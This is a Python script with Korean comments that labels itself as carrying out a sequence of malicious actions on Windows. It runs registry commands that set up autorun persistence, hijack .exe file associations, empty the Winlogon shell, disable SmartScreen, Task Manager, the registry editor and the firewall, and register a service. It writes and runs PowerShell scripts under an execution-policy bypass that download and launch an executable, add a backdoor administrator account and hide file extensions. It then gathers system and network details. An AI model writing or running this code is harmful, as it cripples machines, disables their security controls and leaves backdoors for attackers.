import os
import subprocess
import time

def create_powershell_scripts():
    scripts = {
        "script1.ps1": """
# 인코딩된 명령: 'whoami'
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
powershell -EncodedCommand $encodedCommand > whoami_result.txt
""",
        "script2.ps1": """
# 외부에서 악성 파일 다운로드 후 실행 (예시는 harmless URL로 대체)
$uri = "http://example.com/test.exe"
$output = "$env:TEMP\test.exe"
Invoke-WebRequest -Uri $uri -OutFile $output
Start-Process $output
""",
        "script3.ps1": """
# 로컬 관리자 계정 추가 (관리자 권한 필요)
net user backdooruser P@ssw0rd! /add
net localgroup administrators backdooruser /add
""",
        "script4.ps1": """
# 악성 명령을 시작 프로그램에 등록
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "MalwareLoader" -Value "powershell -windowstyle hidden -command Start-Sleep -Seconds 9999"
""",
        "script5.ps1": """
# 사용자 혼란 유도 - 파일 확장자 숨기기
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Value 1
Stop-Process -Name explorer -Force
Start-Process explorer.exe
"""
    }

    for filename, content in scripts.items():
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content.strip())

# ✅ 레지스트리 키 생성 및 값 변경 함수
def modify_registry():
    # 10개 이상의 레지스트리 명령어 정의


    malicious_reg_commands = [
        # 1. 사용자 로그인 시 악성파일 자동 실행
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v EvilStartup /t REG_SZ /d "C:\malware\evil.exe" /f',

        # 2. SmartScreen 끄기 (보안 기능 무력화)
        r'reg add HKCU\Software\Policies\Microsoft\Windows\System /v EnableSmartScreen /t REG_DWORD /d 0 /f',

        # 3. CMD 비활성화 
        r'reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f',

        # 4. .exe 실행 시 악성 코드 실행되게 연결 변경
        r'reg add HKCR\exefile\shell\open\command /ve /t REG_SZ /d "C:\malware\evil.exe" /f',

        # 5. 탐색기 자동 시작 제거 (시스템 부팅 방해)
        r'reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d "" /f',

        # 6. Task Manager 실행 방지
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',

        # 7. 레지스트리 편집기 사용 금지
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f',

        # 8. 확장자 연결 - .mal 실행 시 cmd 실행되게
        r'reg add HKCR\.mal /ve /d "malfile" /f',
        r'reg add HKCR\malfile\shell\open\command /ve /d "cmd.exe /c echo pwned" /f',

        # 9. 방화벽 비활성화 (경우에 따라)
        r'netsh advfirewall set allprofiles state off',

        # 10. 서비스 자동 시작 등록
        r'reg add HKLM\SYSTEM\CurrentControlSet\Services\MyMalService /v Start /t REG_DWORD /d 2 /f',
    ]

    # 실행
    for cmd in malicious_reg_commands:
        print(f"[실행 중] {cmd}")
        subprocess.run(cmd, shell=True)


# ✅ 외부 PowerShell 스크립트 실행 함수
def execute_powershell_scripts():
    # script1.ps1 ~ script5.ps1 실행
    for i in range(1, 6):
        script_path = f"script{i}.ps1"  # 스크립트 경로
        # PowerShell 실행 정책 우회 후 스크립트 실행
        subprocess.run(f'powershell -ExecutionPolicy Bypass -File "{script_path}"', shell=True)
        time.sleep(0.5)

# ✅ 시스템 정보 수집 후 텍스트로 저장하는 함수
def collect_info():
    # 수집 대상 명령어 정의 (파일명: 명령어)
    info_commands = {
        "systeminfo.txt": "systeminfo",            # 시스템 전체 정보
        "ipconfig.txt": "ipconfig /all",           # 네트워크 설정
        "tasklist.txt": "tasklist",                # 실행 중인 프로세스
        "netstat.txt": "netstat -an",              # 네트워크 연결
        "users.txt": "net user"                    # 로컬 사용자 목록
    }
    
    # 각 명령어 실행 및 결과 저장
    for filename, command in info_commands.items():
        with open(filename, "w") as f:
            # 명령어 실행 후 출력 결과 저장
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            f.write(result.stdout)
        time.sleep(0.5)

# ✅ 메인 함수: 전체 악성행위 순차 실행
def main():
    modify_registry()          # 레지스트리 조작
    execute_powershell_scripts()  # PowerShell 스크립트 실행
    collect_info()             # 정보 수집 및 저장

# ✅ 진입점
if __name__ == "__main__":
    main()